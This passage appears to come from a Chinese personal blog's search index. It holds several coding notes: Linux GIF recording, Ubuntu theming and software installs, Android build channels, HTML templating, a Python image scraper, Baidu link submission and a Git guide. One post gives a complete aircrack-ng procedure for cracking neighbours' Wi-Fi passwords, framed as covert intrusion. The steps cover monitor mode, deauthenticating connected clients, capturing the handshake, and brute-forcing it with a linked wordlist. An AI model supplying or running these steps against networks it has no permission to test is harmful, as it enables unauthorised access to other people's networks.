动画演示\n![演示](https://raw.githubusercontent.com/adymilk/Python-demo/master/screenshot/output.gif)","tags":["Python","game"],"categories":["代码笔记"]},{"title":"Linux 桌面版录制GIF动画","url":"/2018/05/18/20180518-1/","content":"\n## 安装 byzanz\n> sudo apt-get install byzanz\n\n如果软件不存在，先添加下面的软件源再安装\n<!-- more -->\n> sudo add-apt-repository ppa:fossfreedom/byzanzsudo apt-get update && sudo apt-get install byzanz\n\n## 直接录制\n\n> byzanz-record --duration=10 --x=100 --y=100 --width=600 --height=600 output.gif\n\n> --duration 录制时长\n--x x坐标\n--y y坐标\n--width 录制宽度\n--height 录制高度\n--output.gif 录制生成文件名\n\n## 新建脚本byzanz-record-window.sh\n\n```bash\n#!/bin/bash\n\n# Example: byzanz-record-window 30 -c output.gif\n\n# Delay before starting\nDELAY=5\n\n# Duration and output file\nif [ $# -gt 0 ]; then\n    D=\"--duration=$@\"\nelse\n    echo Default recording duration 5s to /tmp/recorded.gif\n    D=\"--duration=10 /tmp/recorded.gif\"\nfi\nXWININFO=$(xwininfo)\nread X < <(awk -F: '/Absolute upper-left X/{print $2}' <<< \"$XWININFO\")\nread Y < <(awk -F: '/Absolute upper-left Y/{print $2}' <<< \"$XWININFO\")\nread W < <(awk -F: '/Width/{print $2}' <<< \"$XWININFO\")\nread H < <(awk -F: '/Height/{print $2}' <<< \"$XWININFO\")\n\necho Delaying $DELAY seconds. After that, byzanz will start\nfor (( i=$DELAY; i>0; --i )) ; do\n    echo $i\n    sleep 1\ndone\n\nbyzanz-record --verbose --delay=0 --x=$X --y=$Y --width=$W --height=$H $D\n```\n\n**记得加上执行权限**\n\n> chmod a+x byzanz-record-window.sh\n\n**录制视频**\n\n> ./byzanz-record-window 5 -c output.gif\n\n![示例](https://github.com/adymilk/Python-demo/blob/master/screenshot/output.gif)\n\n\n\n","tags":["Linux","gif"],"categories":["代码笔记"]},{"title":"完美的 Ubuntu16.04 优化方案","url":"/2017/10/19/2017-08-04-Install-Beautiful-Ubuntu/","content":"\n\nUbuntu 到底怎么样？来，听听人家官网的妹子是怎样介绍的。\n<!-- more -->\n> Ubuntu | 最受欢迎的免费操作系统\nFast, secure and stylishly simple, the Ubuntu operating system is used by 20 million people worldwide every day.\n\n<!-- more -->\n\n- 老子看不懂英文，说人话！\n\n> 快速，安全，简单时尚，Ubuntu操作系统，每天全球有2000万人使用。\n\n这能说明啥？Windows 可是拥有全球百分之八十的系统用户！\n\nok!\n\n> Ubuntu Kylin 中国制造，为中国用户量身定制。\nUbuntu Kylin 是专门为中国市场打造的免费桌面操作系统。它包括 Ubuntu 用户熟识的各种功能，并配有必须的中文软件及程序。与竞争对手不同，Ubuntu Kylin 的用户界面专门为中国用户设计，配上最新支持触摸屏以及 HiDPI 高清显示屏的特征，它可以在各种不同硬件上完美运行。作为 2013 年开始的 Ubuntu 项目的一部分，最新版的 Ubuntu Kylin 将提供五年的支持服务, 确保您的电脑在未来几年能安全顺畅地使用。\n\n这么说到是有点意思了！那你继续说说这个系统到底咋样啊！\n\n> Okey! 一本正经的胡说八道过后，我给大家好好介绍介绍 ubuntu 系统的优缺点，以及日常的美化工作！\n\n从 Windows 转到 Ubuntu 是在一年前。本人平时喜欢折腾写计算机系统 OR 编程之类的东西。先后自学过 HTML、CSS、JAVASCRIPT、JAVA、ANDROID、C++、C#、PHP、SHELL、PYTHON等多种编程语言! 深深的被计算机程序神奇的魅力所吸引。\n在用 Windows 的时候。基本日常操作是通过GUI鼠标点击来完成的。然而自从接触到 Ubuntu （ Linux 系统 ），我已经忘记了使用鼠标的习惯。在 （ Linux ）Ubuntu 系统中，绝大多数操作是通过打开一个叫做终端的应用程序窗口，然后输入命令来完成的！比如我要启动 QQ ，我只需要通过快捷键 `Ctrl+Alt+T` 打开终端，然后输入一个 `Q` 再按一下 `Tab` 键 系统就可以帮我自动补全。这就是 Linux 相比较 Windows 简单高效的优势。有些同学可能疑惑了，相比较 Windows 可能还是鼠标点击一下桌面上的应用程序快捷方式更方便点。你别较真嘛，没听说过，太认真你就输了吗？哈哈哈～ 这只是给大家先简单的举个例子，后面我会说如何给应用程序创建桌面快捷方式。\n\n\n![ ubuntu 桌面 QQ 截图](/img/ubuntu-desktop-qq.png)\n\n### 系统的安装\n\n- #### 安装ubuntu16.04桌面版\n\nubuntu16.04的安装还是比较人性化的，在你安装的时候，会自动从你的最大空余磁盘分出来50G左右用于安装ubuntu系统，并且可以选择和我们的windows系统共存，这是比较令人欣喜的。所以我们完全可以把自己的电脑装成双系统，windows系统用来玩游戏，ubuntu系统用来做开发，随时可以很方便的切换。\n\n- #### 制作ubuntu系统安装盘#\n\n[ubuntu16.04下载地址](http://www.ubuntu.com/download/desktop)\n[图文教程](http://www.linuxidc.com/Linux/2016-04/130520.htm)\n\n在windows下，我们使用一些工具，把ubuntu系统写到u盘里，做成启动盘，写成功之后关闭电脑，设置为u盘启动，或直接打开快捷启动项，选择u盘，接着就会进入ubuntu的安装界面的了，在最左边的语言选择那里选择中文，之后，只要你认识中文，基本都一步一步往下走，都能安装成功。\n\n\n安装的时候最需要注意的就是选择与你的 `windows` 系统共存这一项，一定要仔细\n\n制作u盘启动，我一般使用的工具是ultraiso (自行百度下载)\n\n使用的步骤是：点击文件->打开，选择你本地ubuntu16.04镜像，然后点击启动->写入磁盘镜像，选择你的u盘，点击开始写入，静静等待进度条走到100%\n\n\n### 安装成功之后的一些优化\n\n- #### 检查更新，确保系统最新\n\n点击右上角图标，打开关于这台计算机，点击安装更新：\n\n![](https://dn-phphub.qbox.me/uploads/images/201608/31/4540/gHarcb9MnN.png)\n\n- #### 设置更多的软件源\n\n点击右上角图标，选择系统设置，打开软件和更新，勾选上全部勾选上：\n\n![](http://upload-images.jianshu.io/upload_images/1772607-a9bbe5749a97d244.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n#### 安装显卡驱动\n\n点击右上角图标，选择系统设置，打开软件和更新，找到附加驱动：\n\n![](http://upload-images.jianshu.io/upload_images/1772607-c1d7454d693338a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n#### 关闭swap内存交换，桌面版不需要\n\n```\nvim /etc/sysctl.conf\n\n# 最后一行加入：\nvm.swappiness=0\n```\n\n### 安装mac主题【资料来源于网络】\n\n#### 一些安装前的准备\n\n切换到 `root` 用户：\n\n```\nsudo su\n```\n\n更新源：\n\n```\napt-get update\n```\n\n#### 下载一些必要的工具\n\n```\n# 下载工具\napt-get install wget\n\n# 抓取工具\napt-get install curl\n\n# 编辑器之神\napt-get install vim\n```\n\n#### 安装主题\n\n下载mac壁纸：\n\n```\nhttp://pan.baidu.com/s/1skQCq2T\n\n# 添加源\nadd-apt-repository ppa:noobslab/macbuntu\n\n# 更新源\napt-get update\n```\n\n下载图标和主题\n\n```\n# 下载图标\n\napt-get install macbuntu-os-icons-lts-v7\n\n# 下载主题\napt-get install macbuntu-os-ithemes-lts-v7\n\n# 卸载命令\ncd /usr/share/icons/mac-cursors && sudo ./uninstall-mac-cursors.sh\napt-get remove macbuntu-os-icons-lts-v7 macbuntu-os-ithemes-lts-v7\n```\n\n\n安装 Slingscold：\n\n```\nsudo add-apt-repository ppa:noobslab/apps\nsudo apt-get update\napt-get install slingscold\n```\n\n\n安装 `Albert` (非常好用)\n\n![](http://oukfi430b.bkt.clouddn.com/ubuntu-albert%20.png)\n\n```\nsudo add-apt-repository ppa:nilarimogard/webupd8\nsudo apt-get update\napt-get install albert\n```\n\n安装 Plank Dock：\n\n```\n# 安装plank\napt-get install plank\n\n# 安装plank主题\napt-get install macbuntu-os-plank-theme-lts-v7\n```\n\n替换面板上的Ubuntu Desk为Mac OS：\n```\ncd && wget -O Mac.po http://drive.noobslab.com/data/Mac/change-name-on-panel/mac.po\ncd /usr/share/locale/en/LC_MESSAGES\nsudo msgfmt -o unity.mo ~/Mac.porm ~/Mac.po\n\n# 还原默认\ncd && wget -O Ubuntu.po http://drive.noobslab.com/data/Mac/change-name-on-panel/ubuntu.po\ncd /usr/share/locale/en/LC_MESSAGES\nmsgfmt -o unity.mo ~/Ubuntu.po\nrm ~/Ubuntu.po\n```\n\n修改启动器的logo:\n\n```\nwget -O launcher_bfb.png http://drive.noobslab.com/data/Mac/launcher-logo/apple/launcher_bfb.png\nmv launcher_bfb.png /usr/share/unity/icons/\n\n# 恢复默认\nwget -O launcher_bfb.png http://drive.noobslab.com/data/Mac/launcher-logo/ubuntu/launcher_bfb.png\nmv launcher_bfb.png /usr/share/unity/icons/\n```\n\n安装修改工具:\n\n```\napt-get install unity-tweak-tool\napt-get install gnome-tweak-tool\n```\n\n\n#### 修改主题\n\n找到下载的壁纸，选择一张喜欢的设置成背景\n\n按 `win` 键，打开搜索，搜索 `unity-tweak-tool` 并打开：\n\n![](http://upload-images.jianshu.io/upload_images/1772607-f11edd4bf2357f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n主题选择 `Macbuntu-os`\n\n图标选择 `Macbuntu-os`\n\n指针选择 `Mac-cursors`\n\n回到主界面，进入启动器里面设置启动器隐藏，会隐藏掉左边的启动器栏（看个人喜好）\n\n\n> 这里没有下载 `mac` 的字体，感觉 `mac` 的字体和某些软件的兼容不是很好，不如用 `ubuntu` 的字体\n\n\n\n打开 `Slingscold` 和 `Albert` 以及 `plank` #\n\n按 `win` 键，打开搜索，依次搜索这些软件并打开\n\n现在已经有了 `mac` 的风格了，最后我们还差一步，把这些软件设置成开机启动\n\n按 `win` 键打开搜索，搜索 `tweak` ，选择优化工具并打开：\n\n\n![](http://upload-images.jianshu.io/upload_images/1772607-200e5765fc0de206.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n把这些软件设置成开机启动就可以啦.\n\n\n### 实用的功能\n\n#### 工作区/窗口平铺\n\n这一块主要介绍窗口管理器中的工作区、窗口平铺和热区，这是比较常用的功能。\n\n按 `win` 键打开搜索 `unity tweak tool`，打开之后进入窗口管理器下的工作区：\n\n\n![](http://upload-images.jianshu.io/upload_images/1772607-541de42e79d3ed96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n设置好 `工作区` 之后，在去设置 窗口铺展，`窗口铺展` 效果：\n\n![](http://upload-images.jianshu.io/upload_images/1772607-91c690b0c5f74de4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n然后设置 `热区` ，`热区` 主要的作用是我们鼠标放到哪一个位置，触发什么样的效果：\n\n![](http://upload-images.jianshu.io/upload_images/1772607-63481bafb16762cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n### 远程工具#\n\n如果是 `ssh` 链接远程服务器的话，linux自带命令：\n\n```\nssh user@hostname\n```\n\n文件传输的话：\n\n``\nscp ./test.txt user@hostname:/tmp`\n``\n\n还可以使用可视化的远程文件管理：\n\n![](http://upload-images.jianshu.io/upload_images/1772607-2f10f28570bad7de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n连上之后默认在用户的家目录，使用 `ctrl + L`  可以到我们想要的任何目录：\n\n![](http://upload-images.jianshu.io/upload_images/1772607-3f39ea7d27bfadf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n就可以对远程服务器进行管理和编辑了\n\n### 安装一些必备的软件\n\n#### shadowsocks-qt5\n\n`Ubuntu`  通过PPA源安装，仅支持Ubuntu 14.04或更高版本。\n```\nsudo add-apt-repository ppa:hzwhuang/ss-qt5\nsudo apt-get update\nsudo apt-get install shadowsocks-qt5\n```\n> [使用手册参考这里](https://github.com/shadowsocks/shadowsocks-qt5/wiki/%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C)\n\n#### 微信\n\nTo clone and run this repository you'll need Git and Node.js (which comes with npm) installed on your computer. From your command line:\n```\n# Clone this repository\ngit clone https://github.com/geeeeeeeeek/electronic-wechat.git\n# Go into the repository\ncd electronic-wechat\n# Install dependencies and run the app\nnpm install && npm start\n```\n> 如果慢的话用 `cnpm`\n\nTo pack into an app, simply type one of these:\n```\nnpm run build:osx\nnpm run build:linux\nnpm run build:win32\nnpm run build:win64\n```\n\n\n#### QQ\n\n[方法来源于该博客](http://geekhelp.cn/2016/12/05/linux-qq/)\n\n安装CrossOver之前需要先添加对32位库的支持\n\n```\nsudo dpkg –add-architecture i386\nsudo apt-get update\nsudo apt-get install lib32z1 lib32ncurses5\n```\n下载 `CrossOver deb` 安装包：\n\n> CrossOver 大小123.33MB：[戳我](http://obl1kak28.bkt.clouddn.com/CrossOver.tar.gz)\n\n下载完成后解压。你将会看到这三个文件：\n\n```\nCrossOver\n  |---- crossover-15.deb\n  |---- crossover-15-free.deb\n  |---- deepin-crossover.deb\n```\n\n安装顺序\n\n先安装crossover-15.deb，然后再安装crossover-15-free.deb，接着再安装上 deepin-crossover.deb。\n\n```\ndpkg -i crossover-15.deb\ndpkg -i crossover-15-free.deb\ndpkg -i deepin-crossover.deb\n```\n\n其他依赖问题：\n\n```\nsudo apt-get install -f\n```\n\nQQ 8.1 安装包\n\n> QQ 8.1(89.98MB)：[戳我](http://obl1kak28.bkt.clouddn.com/app.deb)\n\n安装完毕后可以在/usr/share/applications路径下找到QQ快捷方式，拖到桌面还是docky上随你喜好。双击启动QQ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["ubuntu","开源"],"categories":["代码笔记"]},{"title":"Linux 暴力破解WIFI密码","url":"/2017/10/07/Linux 暴力破解WIFI密码/","content":"请一直相信，任何牛逼的技术都是被苦逼的现实需求逼迫的。\n当你抱着你的Mac、Iphone、Ipad准备打开王者荣耀，大喊一声“是时候展现真的技术了！”，结果你却发现这TMD没有网！！！啊啊啊啊啊，什么！你说这个世界如果没有了网络，你都找不到活着的意义？no no no，望着周围的一个个加密的wifi。于是，我决定来一场悄无声息的潜入.........\n\n<!-- more -->\n### 1.1 运行环境\n- ubuntu 16.04\n- 可用的无线网卡\n\n### 1.2 安装aircrack\n```\n# 下载\nwget http://download,aircrack-ng.org/aircrack-ng-1.2-rc2.tar.gz\n# 解压\ntar -zxvf aircrack-ng-1.2-rc2.tar.gz\n# 进入目录\ncd aircrack-ng-1.2-rc2.tar.gz\n# 安装\nmake install\n```\n\n### 1.3 打开网络监听\n```\n# 关闭网络干扰\nsudo airmon-ng check kill\n\n# 查看网卡信息\niwconfig\n\n# 打开监听(wlan0 为无线网卡接口名称)\nairmon-ng start wlan0\n```\n\n### 1.4 监听网络\n```\n# 可用看到附近的WIFI情况\nsudo airodump-ng mon0\n```\n\n这时候可用看到周围一些wifi信息，我们破解wifi 用到的是BSSID（路由器 Mac 地址）， CH（频道），ESSID（WIFI 名称）。\n\n### 1.5 监听指定网络并写入文件\n终端输入命令\n```\nsudo airodump-ng --bssid 路由器Mac地址 -c 频道 -w ./mywifi/tmp mon0\n# -c 后面是监听指定wifi所在的频道\n# -w 后面指定的是文件要写入的路径\n# -mon0 是之前我们指定的网卡接口名称\n```\n\n### 1.6 获取握手包\n打开一个新的终端， 输入\n```\nsudo aireplay-ng -0 2 -a 路由器 Mac 地址 -c 客户端 Mac 地址 mon0\n# -a 后面是监听的路由器Mac地址\n# -c 后面的是客户机器的Mac地址（正在连接此路由器的设备）\n```\n\n### 1.7 破解密码\n此时你的./mywifi 文件夹下面已经写入了一些文件，此时你还缺少.txt字典文件。点击下载[百度云盘字典文件](http://pan.baidu.com/s/1nuDVqwl) 下载密码：wj1e\n\n执行破解\n\n```\n# 1.txt 为字典文件\n# tmp-02.cap 为 1.6 获取在./mywifi 文件夹下的握手包\nsudo aircrack-ng -w 1.txt tmp-02.cap\n```\n当屏幕出现KEY FOUND! [ 破解出来的密码 ]\n\n### 1.8 善后\n 关闭网络监听\n ```\n sudo airmon-ng stop mon0\n ```\n\n开启网络\n```\nsudo service network-mannger start\n```\n### 2.0 完\n","tags":["破解","网络安全"],"categories":["代码笔记"]},{"title":"Android-Studio 多渠道打包","url":"/2017/10/06/2017-10-06-AndroidStudioMultichannelpacking/","content":"\n# 1、图形界面打包\n\n## #需求分析（友盟SDK）\n[友盟SDK](https://dev.umeng.com/analytics/android-doc/integration) 需要在`AndroidManifest.xml`中配置如下值：\n\n<!-- more -->\n\n```\n<meta-data android:value=\"Channel ID\" android:name=\"UMENG_CHANNEL\"/>\n```\n其中`Channel ID`为软件应用市场标识。为了能够动态的设置`Channel ID`。可在`build.gradle`这样配置`productFlavors`\n\n\n```xml\n// 这里假定我们需要打包的渠道为酷安市场、360、小米、百度、豌豆荚\n\nandroid {  \n    productFlavors {\n        kuan {\n            manifestPlaceholders = [UMENG_CHANNEL_VALUE: \"kuan\"]\n        }\n        xiaomi {\n            manifestPlaceholders = [UMENG_CHANNEL_VALUE: \"xiaomi\"]\n        }\n        qh360 {\n            manifestPlaceholders = [UMENG_CHANNEL_VALUE: \"qh360\"]\n        }\n        baidu {\n            manifestPlaceholders = [UMENG_CHANNEL_VALUE: \"baidu\"]\n        }\n        wandoujia {\n            manifestPlaceholders = [UMENG_CHANNEL_VALUE: \"wandoujia\"]\n        }\n    }  \n}\n```\n\n<!-- more -->\n>  所谓ProductFlavors其实就是可定义的产品特性，配合 manifest merger 使用的时候就可以达成在一次编译过程中产生多个具有自己特性配置的版本。上面这个配置的作用就是，为每个渠道包产生不同的 UMENG_CHANNEL_VALUE 的值。\n\n## #执行打包\n![执行打包](http://img.blog.csdn.net/20160629090244167)\n\n## #选择打包渠道\n![选择打包渠道](http://img.blog.csdn.net/20160629090229510)\n\n## #打包成功\n![](http://img.blog.csdn.net/20160629091100616)\n\n# 2、命令行打包\n\n除了使用AndroidStudio图形打包操作以外，我们也可以使用命令行进行打包操作，具体步骤如下：\n\n## #项目根目录打开`Terminal`面板，\n\n> 输入`gradlew assembleRelease`命令\n\n如果系统中没有安装Gradle，则会自动下载完成安装及初始化\n\n## #打包成功后\n会提示`BUILD SUCCESSRUL`\n\n在`app–>build–>outputs–>apk`路径中就可以看到打包成功后的APK","tags":["Android"],"categories":["代码笔记"]},{"title":"网页模板分离的高效方法","url":"/2017/08/15/2017-08-15-HTML-template-separation/","content":"> 网站模板的设计，一般的，我们做网站有一些通用的部分，比如 导航，底部，访问统计代码等等.\n比如 `header.html`, `footer.html`, `content.html`.....其实我们可以写一个 `base.html` 来包含这些通用文件。ok,让我们一起学习如何实现的吧。\n\n<!-- more -->\n## 网页基础\n**以前我们这样写网页**\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n\t<title></title>\n</head>\n<body>\n我的地盘我做主！\n</body>\n</html>\n```\n\n**看完本片博客，你以后可以这样写**\n\n```\n<extend name=\"Temp/base\"/>\n<block name=\"content\">\n\t我的地盘我做主！\n</block>\n```\n> WOW, 好腻嗨啊......怎么做到的...\n\n## 如何实现\n\n### 新建文件夹和文件\n\n新建一个文件夹 `Temp` 模板文件夹的意思。然后在这个 `Temp` 文件夹里面新建文件`head.html`、`footer.html`、`index.html`\n\n最终目录结构是这样的\n\n\nTemp\n\t├── base.html\n\t├── footer.html\n\t├── head.html\n\t└── index.html\n\n\n### 接下来编辑 `head.html` 文件\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n\t<title></title>\n</head>\n<body>\n\n```\n\n### 继续编辑 `footer.html`文件\n\n```html\n<footer></footer>\n</body>\n</html>\n```\n\n### 编辑 `base.html`\n\n```html\n<include file=\"Temp/head\" />\n\n<block name=\"content\">\n\n</block>\n\n<include file=\"Temp/footer\" />\n```\n\n### 这时候 `index.html` 应该这样来写\n\n```\n<extend name=\"Temp/base\"/>\n<block name=\"content\">\n\t我的地盘我做主！\n</block>\n```\n\n### 浏览器运行 `index.html` 看看吧\n\n## 为什么要实现模板分离？\n\n这样我们就完成模板分离的处理。好处在于当一个网站的网页特别多的时候，相同的代码又不可避免。这时候用这个方法可以起到方便管理的作用。使你的代码高效、清晰、明了！\n\n\n\n\n\n\n\n\n\n","tags":["template","模板分离"],"categories":["代码笔记"]},{"title":"学习Python系列第一天","url":"/2017/08/10/2017-08-10-StudyPythonFirstDay/","content":"\n> Python 是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。被称作写爬虫最好的语言之一！从今天开始让我们一起来学习吧。每天一个小例子，开心学 Python .\n\n<!-- more -->\n### 开发环境\n\n> 这里我假设你已经安装好了 Python 开发环境，如果你不知道如何安装Python 开发环境。可以点击[这里](http://www.runoob.com/python/python-install.html)\n\n\n### 入门第一课：Hello Python\n\n```python\n\n#!/usr/bin/python\n\nprint \"Hello, Python!\";\n```\n### 运行结果\n\n> Hello Python\n\n### 批量下载网站图片示例\n\n#### 1.1 获取整个页面数据\n```python\n#coding=utf-8\nimport urllib\n\ndef getHtml(url):\n    page = urllib.urlopen(url)\n    html = page.read()\n    return html\n\nhtml = getHtml(\"http://tieba.baidu.com/p/2738151262\")\n\nprint html\n```\n\n#### 代码解释\n> Urllib 模块提供了读取web页面数据的接口，我们可以像读取本地文件一样读取www和ftp上的数据。首先，我们定义了一个getHtml()函数:urllib.urlopen()方法用于打开一个URL地址。read()方法用于读取URL上的数据，向getHtml()函数传递一个网址，并把整个页面下载下来。执行程序就会把整个网页打印输出。\n\n#### 1.2 筛选页面中想要的数据\nPython 提供了非常强大的正则表达式\n假如我们百度贴吧找到了几张漂亮的壁纸，通过到前段查看工具。找到了图片的地址，如：src=”http://imgsrc.baidu.com/forum......jpg”pic_ext=”jpeg”\n\n![](http://images.cnitblog.com/i/311516/201403/020013141657112.png)\n\n```python\nimport re\nimport urllib\n\ndef getHtml(url):\n    page = urllib.urlopen(url)\n    html = page.read()\n    return html\n\ndef getImg(html):\n    reg = r'src=\"(.+?\\.jpg)\" pic_ext'\n    imgre = re.compile(reg)\n    imglist = re.findall(imgre,html)\n    return imglist      \n   \nhtml = getHtml(\"http://tieba.baidu.com/p/2460150866\")\nprint getImg(html)\n```\n\n我们又创建了getImg()函数，用于在获取的整个页面中筛选需要的图片连接。re模块主要包含了正则表达式：\nre.compile() 可以把正则表达式编译成一个正则表达式对象.\nre.findall() 方法读取html 中包含 imgre（正则表达式）的数据。\n运行脚本将得到整个页面中包含图片的URL地址。\n\n#### 1.3 将页面筛选的数据保存到本地\n\n把筛选的图片地址通过for循环遍历并保存到本地，代码如下：\n\n```python\n#coding=utf-8\nimport urllib\nimport re\n\ndef getHtml(url):\n    page = urllib.urlopen(url)\n    html = page.read()\n    return html\n\ndef getImg(html):\n    reg = r'src=\"(.+?\\.jpg)\" pic_ext'\n    imgre = re.compile(reg)\n    imglist = re.findall(imgre,html)\n    x = 0\n    for imgurl in imglist:\n        urllib.urlretrieve(imgurl,'%s.jpg' % x)\n        x+=1\n\n\nhtml = getHtml(\"http://tieba.baidu.com/p/2460150866\")\n\nprint getImg(html)\n```\n这里的核心是用到了urllib.urlretrieve()方法，直接将远程数据下载到本地。\n\n　　通过一个for循环对获取的图片连接进行遍历，为了使图片的文件名看上去更规范，对其进行重命名，命名规则通过x变量加1。保存的位置默认为程序的存放目录。\n\n程序运行完成，将在目录下看到下载到本地的文件。\n\n\n![](http://images.cnitblog.com/i/311516/201403/020014265548094.png)\n\n\n\n","tags":["python","爬虫"],"categories":["代码笔记"]},{"title":"hexo 向百度主动推送链接","url":"/2017/08/09/2017-08-09-push-hexo-to-baidu/","content":"\n## 分析\n\n### 百度站长工具\n\n百度站长提供了自动提交和手动提交两种方式。这个我们肯定不用手动提交这个弱智的方式。\n<!-- more -->\n### 自动提交\n\n自动提交分为三种方式自动主动推送（实时），自动推送，sitemap三种方式。\n\n#### 主动推送（实时）\n\n及时发现：可以缩短百度爬虫发现您站点新链接的时间，使新发布的页面可以在第一时间被百度收录\n保护原创：对于网站的最新原创内容，使用主动推送功能可以快速通知到百度，使内容可以在转发之前被百度发现。\n主动推送提供了4种提交的方式，curl,post,php,ruby。这里以curl为例。\n我们将包含html地址的urls.txt文件提交到接口调用地址。我们的重点是怎么生成urls.txt\n\n\n#### 自动推送\n\n正如官网所说的那样，将代码复制在html页面的head头里即可，这个自己看百度站长工具吧。\n\n\n#### sitemap\n\nsitemap是我们提交一个带有url地址的txt或者xml文件。我们这里也是提交urls.txt这个文件。同样重点也是生成这个文件。\n\n### 生成urls.txt文件\n\n我们知道在执行hexo g的命令后，会在public文件夹下生成Markdown文件对应的html文件，我们的思路先查找出这些html文件，然后放置在urls.txt这个文件里。\n\n#### 查找html文件\n我们在post-receive这个文件里执行的都是shell命令，那么我们首先用shell命令查找这些html文件的路径。这个就用到了grep这个命令。grep语法参考linux grep命令详解\n在public的文件夹下，执行下面的命令\n\n```\ngrep -r -l 'index.html' * >>1.txt\n\n```\n\n> 是将查询的记录添加到1.txt中。\n上面的命令生成的路径没有带域名，我们需要使用sed这个命令，在每个路径上添加域名生成urls.txt。\n\n\n```\ned 's/^/http:\\/\\/adymilk.cn\\/&/g' 1.txt >>urls.txt\n```\n\n> 上面的代码是将1.txt里的路径都在开头添加上域名，并把新路径放在urls.txt文件里。\n\n\n### 开始主动推送\n\n```\ncurl -H 'Content-Type:text/plain' --data-binary @urls.txt \"http://data.zz.baidu.com/urls?site=adymilk.cn&token=XXX\"\n```\n\n","tags":["hexo","百度站长"],"categories":["代码笔记"]},{"title":"Git recipes in Chinese. 高质量的Git中文教程.","url":"/2017/08/04/2017-08-04-what-is-git/","content":"# Git 图解\n\n> BY 童仲毅（[geeeeeeeeek@github](https://github.com/geeeeeeeeek/git-recipes/)）\n<!-- more -->\n>\n> 这是一篇在[原文](http://marklodato.github.io/visual-git-guide/index-zh-cn.html)基础上演绎的文章。原作者 [Mark Lodato](lodatom@gmail.com)，译者 [wych](ellrywych@gmail.com)。原文采用[创用 CC 姓名标示-非商业性-相同方式分享 3.0 美国授权条款](https://creativecommons.org/licenses/by-nc-sa/3.0/us/)授权。\n\n此页图解 git 中的最常用命令。如果你稍微理解 git 的工作原理，这篇文章能够让你理解的更透彻。\n\n\n\n## 基本用法\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/basic-usage.svg)\n\n上面的四条命令在工作目录、stage 缓存(也叫做索引)和 commit 历史之间复制文件。\n\n* `git add files` 把工作目录中的文件加入 stage 缓存\n* `git commit` 把 stage 缓存生成一次 commit，并加入 commit 历史\n* `git reset -- files` 撤销最后一次 `git add files`，你也可以用 `git reset` 撤销所有 stage 缓存文件\n* `git checkout -- files` 把文件从 stage 缓存复制到工作目录，用来丢弃本地修改\n\n你可以用 `git reset -p`、`git checkout -p` 或 `git add -p` 进入交互模式，也可以跳过 stage 缓存直接从  commit历史取出文件或者直接提交代码。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/basic-usage-2.svg)\n\n* `git commit -a ` 相当于运行 `git add` 把所有当前目录下的文件加入 stage 缓存再运行 `git commit`。\n* `git commit files` 进行一次包含最后一次提交加上工作目录中文件快照的提交，并且文件被添加到 stage 缓存。\n* `git checkout HEAD -- files` 回滚到复制最后一次提交。\n\n## 约定\n\n后文中以下面的形式使用图片：\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/conventions.svg)\n\n绿色的5位字符表示提交的 ID，分别指向父节点。分支用橙色显示，分别指向特定的提交。当前分支由附在其上的 `_HEAD_` 标识。\n\n这张图片里显示最后 5 次提交，`_ed489_` 是最新提交。 `_master_` 分支指向此次提交，另一个 `_maint_` 分支指向祖父提交节点。\n\n## 命令详解\n\n### Diff\n\n有许多种方法查看两次提交之间的变动，下面是其中一些例子。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/diff.svg)\n\n### Commit\n\n提交时，Git 用 stage 缓存中的文件创建一个新的提交，并把此时的节点设为父节点。然后把当前分支指向新的提交节点。下图中，当前分支是 `_master_`。\n\n在运行命令之前，`_master_` 指向 `_ed489_`，提交后，`_master_` 指向新的节点`_f0cec_` 并以 `_ed489_` 作为父节点。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/commit-master.svg)\n\n即便当前分支是某次提交的祖父节点，Git 会同样操作。下图中，在 `_master_` 分支的祖父节点 `_maint_` 分支进行一次提交，生成了 `_1800b_`。\n\n这样，`_maint_ `分支就不再是 `_master_` 分支的祖父节点。此时，[merge](#merge) 或者 [rebase](#rebase) 是必须的。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/commit-maint.svg)\n\n如果想更改一次提交，使用 `git commit --amend`。Git 会使用与当前提交相同的父节点进行一次新提交，旧的提交会被取消。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/commit-amend.svg)\n\n另一个例子是[分离HEAD提交](#detached)，在后面的章节中介绍。\n\n### Checkout\n\n`git checkout` 命令用于从历史提交（或者 stage 缓存）中拷贝文件到工作目录，也可用于切换分支。\n\n当给定某个文件名（或者打开 `-p` 选项，或者文件名和-p选项同时打开）时，Git 会从指定的提交中拷贝文件到 stage 缓存和工作目录。比如，`git checkout HEAD~ foo.c` 会将提交节点 `_HEAD~_`（即当前提交节点的父节点）中的 `foo.c` 复制到工作目录并且加到 stage 缓存中。如果命令中没有指定提交节点，则会从 stage 缓存中拷贝内容。注意当前分支不会发生变化。\n\n![enter image description 